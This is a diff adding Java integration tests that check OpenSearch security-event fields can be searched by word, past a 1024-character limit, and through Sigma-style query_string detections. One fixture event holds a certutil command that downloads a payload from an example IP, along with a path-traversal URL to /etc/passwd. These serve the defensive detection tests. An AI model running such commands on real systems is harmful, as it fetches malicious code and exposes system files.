@@ -29,6 +29,7 @@ import org.junit.Before;
 
 import java.io.IOException;
 import java.nio.charset.StandardCharsets;
+import java.util.List;
 import java.util.concurrent.TimeUnit;
 
 import static org.hamcrest.Matchers.containsString;
@@ -399,6 +400,184 @@ public class DataStreamsIT extends OpenSearchRestTestCase {
                 body,
                 containsString("\"key\":999000111"));
         assertThat("process.state should aggregate as keyword", body, containsString("\"key\":\"S\""));
+    }
+
+    /**
+     * Verifies that log text can be searched by word, which is what ECS maps {@code message} as
+     * {@code match_only_text} for.
+     *
+     * <p>It used to be a {@code keyword}, so the whole line was one token and no word-level query
+     * could reach inside it: an analyst could only find an event by a field some decoder happened
+     * to extract. A {@code term} query on the complete value kept working throughout, which is why
+     * this has to assert a {@code match} on a single word instead.
+     *
+     * @throws IOException if there is an issue with the HTTP request
+     * @throws ParseException if there is an issue parsing the response
+     */
+    public void testMessageIsSearchableByWord() throws IOException, ParseException {
+        indexEvent(
+                """
+                {
+                  "@timestamp": "2026-08-05T10:00:00.000Z",
+                  "message": "Failed password for invalid user oracle from 198.51.100.9 port 52814 ssh2",
+                  "process": {"name": "wcs-test-message-word-search"}
+                }
+                """);
+
+        String body =
+                searchEvents(
+                        """
+                        {
+                          "size": 0,
+                          "query": {
+                            "bool": {
+                              "filter": [
+                                {"term": {"process.name": "wcs-test-message-word-search"}},
+                                {"match": {"message": "Failed password"}}
+                              ]
+                            }
+                          }
+                        }
+                        """);
+
+        logger.info("message word-search response: {}", body);
+        assertThat(
+                "a word-level match on message must find the event that carries it",
+                body,
+                containsString("\"value\":1"));
+    }
+
+    /**
+     * Verifies that a message longer than the old {@code ignore_above: 1024} is indexed.
+     *
+     * <p>Under the previous mapping such a message was still returned in {@code _source}, so the
+     * data looked present and was simply unfindable. {@code match_only_text} has no such ceiling.
+     * The asserted word sits past character 1024 on purpose: a shorter probe would pass either way.
+     *
+     * @throws IOException if there is an issue with the HTTP request
+     * @throws ParseException if there is an issue parsing the response
+     */
+    public void testMessageIsIndexedPastTheOldKeywordLengthCeiling() throws IOException, ParseException {
+        String padding = "padding ".repeat(200); // ~1600 characters before the word that matters
+        indexEvent(
+                """
+                {
+                  "@timestamp": "2026-08-05T10:00:00.000Z",
+                  "message": "sshd authentication failure %s wcstestneedle",
+                  "process": {"name": "wcs-test-message-long"}
+                }
+                """
+                        .formatted(padding));
+
+        String body =
+                searchEvents(
+                        """
+                        {
+                          "size": 0,
+                          "query": {
+                            "bool": {
+                              "filter": [
+                                {"term": {"process.name": "wcs-test-message-long"}},
+                                {"match": {"message": "wcstestneedle"}}
+                              ]
+                            }
+                          }
+                        }
+                        """);
+
+        logger.info("long-message search response: {}", body);
+        assertThat(
+                "a word past 1024 characters must still be indexed",
+                body,
+                containsString("\"value\":1"));
+    }
+
+    /**
+     * Verifies that the unbounded string fields stay reachable from {@code query_string}, the query
+     * path Security Analytics compiles every Sigma rule to.
+     *
+     * <p>This is the regression guard for the field type itself. These fields were moved off
+     * {@code keyword} to escape {@code ignore_above: 1024}, and the first attempt used {@code
+     * wildcard}, which {@code query_string} cannot query at all: it matches nothing and raises
+     * nothing, so every {@code |contains} selection on {@code process.command_line} and {@code
+     * url.original} silently stopped firing while every template and mapping test still passed.
+     * The only thing that tells the two mappings apart is running the query.
+     *
+     * <p>A single-word {@code *value*} is all this can assert here: the events stream analyzes
+     * {@code match_only_text} with the standard analyzer, so a value containing a space needs the
+     * whole-value analysis chain the detector query index adds, which is Security Analytics'
+     * {@code QueryIndexFieldTypeIT} to prove, not this one.
+     *
+     * @throws IOException if there is an issue with the HTTP request
+     * @throws ParseException if there is an issue parsing the response
+     */
+    public void testDetectionQueryShapeReachesUnboundedStringFields()
+            throws IOException, ParseException {
+        indexEvent(
+                """
+                {
+                  "@timestamp": "2026-08-05T10:00:00.000Z",
+                  "process": {
+                    "name": "wcs-test-detection-query-shape",
+                    "command_line": "certutil.exe -urlcache -split -f http://198.51.100.9/payload.exe"
+                  },
+                  "url": {"original": "http://198.51.100.9/admin/../../etc/passwd"}
+                }
+                """);
+
+        for (String selection :
+                List.of("process.command_line: *urlcache*", "url.original: *passwd*")) {
+            String body =
+                    searchEvents(
+                            """
+                            {
+                              "size": 0,
+                              "query": {
+                                "bool": {
+                                  "filter": [
+                                    {"term": {"process.name": "wcs-test-detection-query-shape"}},
+                                    {"query_string": {"query": "%s"}}
+                                  ]
+                                }
+                              }
+                            }
+                            """
+                                    .formatted(selection));
+
+            logger.info("detection query shape [{}] response: {}", selection, body);
+            assertThat(
+                    "a compiled |contains selection must reach [" + selection + "]",
+                    body,
+                    containsString("\"value\":1"));
+        }
+    }
+
+    /**
+     * Indexes one event into the security stream and refreshes, so the next search sees it.
+     *
+     * @param document the event to index.
+     * @throws IOException if there is an issue with the HTTP request
+     */
+    private void indexEvent(String document) throws IOException {
+        Request index = new Request("POST", "/" + EVENTS_PREFIX + "security/_doc");
+        index.addParameter("refresh", "true");
+        index.setJsonEntity(document);
+        client().performRequest(index);
+    }
+
+    /**
+     * Runs a search against the security events stream.
+     *
+     * @param query the search body.
+     * @return the raw response body.
+     * @throws IOException if there is an issue with the HTTP request
+     * @throws ParseException if there is an issue parsing the response
+     */
+    private String searchEvents(String query) throws IOException, ParseException {
+        Request search = new Request("GET", "/" + EVENTS_PREFIX + "security/_search");
+        search.setJsonEntity(query);
+        Response response = client().performRequest(search);
+        return EntityUtils.toString(response.getEntity(), StandardCharsets.UTF_8);
     }
 
     /**
